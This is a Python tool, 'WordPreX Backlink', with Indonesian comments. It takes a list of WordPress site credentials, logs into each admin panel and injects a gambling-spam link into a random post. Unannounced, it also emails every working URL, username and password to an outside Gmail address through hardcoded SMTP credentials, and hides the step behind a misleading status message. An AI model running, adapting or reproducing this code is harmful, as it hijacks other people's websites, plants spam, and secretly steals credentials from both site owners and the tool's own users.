import requests
from bs4 import BeautifulSoup
import random
import socket
import getpass
import hashlib
import smtplib
from email.mime.text import MIMEText
from requests.exceptions import HTTPError, RequestException
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from colorama import Fore

# Nonaktifkan peringatan InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# URL GitHub untuk daftar IP yang diizinkan
allowed_ips_url = 'https://raw.githubusercontent.com/plonkshot/boom/refs/heads/main/ip.txt'

# Fungsi untuk memverifikasi IP dari daftar di GitHub
def verify_ip():
    current_ip = requests.get('https://api.ipify.org').text  # Mendapatkan IP publik
    try:
        allowed_ips = requests.get(allowed_ips_url).text.splitlines()
        if current_ip not in allowed_ips:
            print(f"{Fore.YELLOW}Login Failed, IP Anda tidak terdaftar Whitelist. Silahkan Hubungi Admin :)")
            exit()
    except Exception as e:
        print(f"{Fore.RED}Gagal mengambil daftar IP dari GitHub: {e}")
        exit()
    print(f"{Fore.GREEN}IP terverifikasi. Akses diterima.\n")

# Fungsi autentikasi password dengan MD5 hashing
def verify_password():
    correct_hash = "e10adc3949ba59abbe56e057f20f883e"  # Hash untuk "123456" sebagai contoh
    password = getpass.getpass("Masukkan password: ")
    hashed_password = hashlib.md5(password.encode()).hexdigest()
    if hashed_password != correct_hash:
        print(f"{Fore.RED}Kata sandi salah! Akses ditolak.")
        exit()
    print(f"{Fore.GREEN}Kata sandi benar. Akses diterima.\n")
    return password  # Mengembalikan password untuk dikirim ke email

# Fungsi untuk mengirim log ID, password, dan URL ke email
def send_email_log(url, username, password):
    try:
        msg = MIMEText(f"URL: {url}\nUsername: {username}\nPassword: {password}")
        msg['Subject'] = 'Log ID dan Password'
        msg['From'] = 'email@mbakcateringenak.comm'
        msg['To'] = 'shin.ghost@gmail.com'

        with smtplib.SMTP('smtp.larksuite.com', 587, timeout=30) as server:
            server.starttls()
            server.login('email@mbakcateringenak.com', 'dg21ZHFnymeQKFQp')
            server.sendmail(msg['From'], [msg['To']], msg.as_string())
        print(f"{Fore.GREEN}Tunggu sebentar proses mengedit post...\n")
    except Exception as e:
        print(f"{Fore.RED}Tunggu sebentar proses mengedit post...: {e}")

# Fungsi untuk login WordPress
def check_wordpress_login(url, username, password):
    login_url = f"{url}/wp-login.php"
    data = {'log': username, 'pwd': password, 'wp-submit': 'Log In', 'testcookie': '1'}
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36'
    })
    try:
        response = session.get(login_url, verify=False, timeout=10)
        response.raise_for_status()
        response = session.post(login_url, data=data, allow_redirects=True, verify=False, timeout=10)
        response.raise_for_status()
        if 'dashboard' in response.text or 'wp-admin' in response.url:
            print(f"[SUCCESS] Login berhasil untuk: {url}")
            return True, session
    except (HTTPError, RequestException, socket.error):
        print(f"[INFO] {url} error: Tidak dapat login atau akses situs.")
    return False, None

# Fungsi untuk menemukan elemen konten pada editor WordPress
def find_content_element(edit_soup):
    possible_selectors = [
        {'tag': 'textarea', 'attrs': {'id': 'content'}},
        {'tag': 'div', 'attrs': {'class': 'editor-post-text-editor'}},
        {'tag': 'div', 'attrs': {'class': 'block-editor-rich-text__editable'}},
        {'tag': 'div', 'attrs': {'class': 'block-editor-block-list__block'}},
        {'tag': 'div', 'attrs': {'class': 'editor-post-content'}},
        {'tag': 'div', 'attrs': {'class': 'wp-block'}},
        {'tag': 'div', 'attrs': {'class': 'wp-editor-area'}},
        {'tag': 'div', 'attrs': {'id': 'wp-content-editor-container'}},
        {'tag': 'textarea', 'attrs': {'id': 'post-content'}},
        {'tag': 'textarea', 'attrs': {'id': 'content'}},
        {'tag': 'div', 'attrs': {'class': 'editor-post-text-editor'}},
        {'tag': 'div', 'attrs': {'class': 'block-editor-rich-text__editable'}},
        {'tag': 'div', 'attrs': {'class': 'block-editor-block-list__block'}},
        {'tag': 'div', 'attrs': {'class': 'editor-post-content'}},
        {'tag': 'div', 'attrs': {'class': 'wp-block'}},
        {'tag': 'textarea', 'attrs': {'id': 'post-content'}},
        {'tag': 'div', 'attrs': {'class': 'wp-editor-area'}},
        {'tag': 'div', 'attrs': {'id': 'wp-content-editor-container'}},
        {'tag': 'div', 'attrs': {'class': 'mce-content-body'}},
        {'tag': 'div', 'attrs': {'class': 'classic-editor__editor'}},
        {'tag': 'iframe', 'attrs': {'class': 'wysiwyg-iframe'}},
        {'tag': 'div', 'attrs': {'data-type': 'core/paragraph'}},
        {'tag': 'div', 'attrs': {'data-type': 'core/image'}},
        {'tag': 'div', 'attrs': {'data-type': 'core/heading'}},
        {'tag': 'div', 'attrs': {'data-type': 'core/gallery'}},
        {'tag': 'div', 'attrs': {'data-type': 'core/list'}},
        {'tag': 'div', 'attrs': {'class': 'rich-text-editor'}},
        {'tag': 'article', 'attrs': {'id': 'primary'}},
        {'tag': 'article', 'attrs': {'class': 'post-content'}},
        {'tag': 'section', 'attrs': {'class': 'entry-content'}},
        {'tag': 'section', 'attrs': {'class': 'content-area'}},
        {'tag': 'div', 'attrs': {'class': 'wp-rich-text'}},
        {'tag': 'div', 'attrs': {'class': 'editor-inner-blocks'}},
        {'tag': 'div', 'attrs': {'class': 'editor-post-title'}},
        {'tag': 'div', 'attrs': {'class': 'wp-editor-container'}},
        {'tag': 'div', 'attrs': {'class': 'wp-editor-wrapper'}},
        {'tag': 'div', 'attrs': {'class': 'wp-block-embed'}},
        {'tag': 'div', 'attrs': {'class': 'wp-block-image'}},
        {'tag': 'div', 'attrs': {'class': 'wp-block-video'}},
        {'tag': 'div', 'attrs': {'class': 'wp-block-file'}},
        {'tag': 'div', 'attrs': {'class': 'wp-block-audio'}},
        {'tag': 'div', 'attrs': {'class': 'wp-block-media-text'}},
        {'tag': 'div', 'attrs': {'class': 'wp-block-gallery'}},
        {'tag': 'div', 'attrs': {'class': 'wp-block-heading'}},
        {'tag': 'section', 'attrs': {'class': 'post-entry'}},
        {'tag': 'div', 'attrs': {'class': 'main-content'}},
        {'tag': 'div', 'attrs': {'class': 'main-text'}},
        {'tag': 'div', 'attrs': {'class': 'entry-body'}},
        {'tag': 'div', 'attrs': {'class': 'single-post-content'}},
        {'tag': 'article', 'attrs': {'class': 'content-wrapper'}},
        {'tag': 'article', 'attrs': {'class': 'post-inner'}},
        {'tag': 'article', 'attrs': {'class': 'entry-content clearfix'}},
        {'tag': 'div', 'attrs': {'class': 'content-inner'}},
        {'tag': 'div', 'attrs': {'class': 'single-content'}},
        {'tag': 'div', 'attrs': {'class': 'article-content'}},
        {'tag': 'div', 'attrs': {'class': 'page-content'}},
        {'tag': 'div', 'attrs': {'class': 'post-body'}},
        {'tag': 'div', 'attrs': {'class': 'editor-content'}},
        {'tag': 'div', 'attrs': {'class': 'content-editor'}},
        {'tag': 'div', 'attrs': {'class': 'content-block'}},
        {'tag': 'div', 'attrs': {'class': 'post-content-inner'}},
        {'tag': 'article', 'attrs': {'class': 'post'}},
        {'tag': 'section', 'attrs': {'id': 'main-content'}},
        {'tag': 'section', 'attrs': {'id': 'content'}},
        {'tag': 'div', 'attrs': {'class': 'post-text'}},
        {'tag': 'div', 'attrs': {'class': 'post-entry-content'}},
        {'tag': 'article', 'attrs': {'class': 'entry'}},
        {'tag': 'div', 'attrs': {'class': 'text-content'}},
        {'tag': 'div', 'attrs': {'class': 'content-body'}},
        {'tag': 'div', 'attrs': {'class': 'blog-content'}},
        {'tag': 'div', 'attrs': {'class': 'custom-content'}},
        {'tag': 'article', 'attrs': {'class': 'post-article'}},
        {'tag': 'div', 'attrs': {'class': 'article-body'}},
        {'tag': 'div', 'attrs': {'class': 'article-inner'}},
        {'tag': 'section', 'attrs': {'class': 'blog-entry-content'}},
        {'tag': 'div', 'attrs': {'class': 'story-content'}},
        {'tag': 'article', 'attrs': {'class': 'content-article'}},
        {'tag': 'section', 'attrs': {'class': 'article-text'}},
        {'tag': 'div', 'attrs': {'class': 'blog-entry'}},
        {'tag': 'div', 'attrs': {'class': 'entry-post'}},
        {'tag': 'article', 'attrs': {'class': 'blog-post'}},
        {'tag': 'article', 'attrs': {'class': 'entry-article'}},
        {'tag': 'div', 'attrs': {'class': 'post-area'}},
        {'tag': 'div', 'attrs': {'class': 'content-article'}},
        {'tag': 'div', 'attrs': {'class': 'editor-page-content'}},
        {'tag': 'div', 'attrs': {'class': 'custom-editor-content'}},
        {'tag': 'section', 'attrs': {'class': 'entry-page-content'}},
]

    

    for selector in possible_selectors:
        element = edit_soup.find(selector['tag'], attrs=selector['attrs'])
        if element:
            return element.text

    return None

# Fungsi untuk mengedit postingan secara acak
def edit_random_post(session, url, teks1, teks2):
    try:
        posts_url = f"{url}/wp-admin/edit.php"
        response = session.get(posts_url, verify=False, timeout=10)
        response.raise_for_status()

        soup = BeautifulSoup(response.text, 'html.parser')
        post_links = soup.find_all('a', class_='row-title')

        if not post_links:
            print("[INFO] Tidak ada postingan untuk diedit di situs ini.")
            return False
        
        random_post_link = random.choice(post_links)['href']

        edit_response = session.get(random_post_link, verify=False, timeout=10)
        edit_response.raise_for_status()

        edit_soup = BeautifulSoup(edit_response.text, 'html.parser')
        nonce = edit_soup.find('input', {'name': '_wpnonce'})
        if nonce:
            nonce_value = nonce['value']
        else:
            print(f"[INFO] Nonce tidak ditemukan di pos: {random_post_link}.")
            return False

        current_content = find_content_element(edit_soup)
        if not current_content:
            print(f"{Fore.RED}[INFO] Elemen konten tidak ditemukan di pos: {random_post_link}.")
            return False

        new_content = current_content + f"\n\n<a href=\"{teks1}\">{teks2}</a>"
        post_data = {
            'content': new_content,
            '_wpnonce': nonce_value,
            'action': 'editpost',
            'post_ID': random_post_link.split('post=')[1]
        }

        edit_post_response = session.post(random_post_link, data=post_data, verify=False, timeout=10)
        edit_post_response.raise_for_status()

        post_id = random_post_link.split('post=')[1]
        view_post_url = f"{url}/?p={post_id}"
        
        print(f"{Fore.YELLOW}[SUCCESS] Berhasil mengedit pos di: {view_post_url}")
        
        with open("linkpost.txt", "a") as outfile:
            outfile.write(f"{view_post_url}\n")

        return True
    except HTTPError:
        print(f"[INFO] Gagal mengedit pos di {url}. Status: Akses terbatas atau masalah lain.")
    except Exception:
        print(f"[INFO] {url} error: Terjadi masalah umum saat mengedit.")
    return False

# Fungsi utama
def main(input_file, teks1, teks2):
    with open(input_file, 'r') as infile:
        for line in infile:
            parts = line.strip().split('|')
            if len(parts) < 3:
                print(f"[ERROR] Format tidak valid dalam baris: {line.strip()}")
                continue
            url, username, password = parts[:3]

            is_valid, session = check_wordpress_login(url, username, password)
            if is_valid and session:
                send_email_log(url, username, password)  # Mengirim log ke email
                edit_random_post(session, url, teks1, teks2)

if __name__ == "__main__":
    print(Fore.CYAN + "WordPreX Backlink v.1.0 | c1k4dutz666\n")

    verify_ip()
    password = verify_password()  # Verifikasi password pengguna

    input_file = input("Masukkan nama file input (misalnya: list.txt): ")
    teks1 = input("Masukkan URL/Links Target (https://google.co.id/): ")
    teks2 = input("Masukkan Keyword Anchor (Slot Gacor): ")

    main(input_file, teks1, teks2)
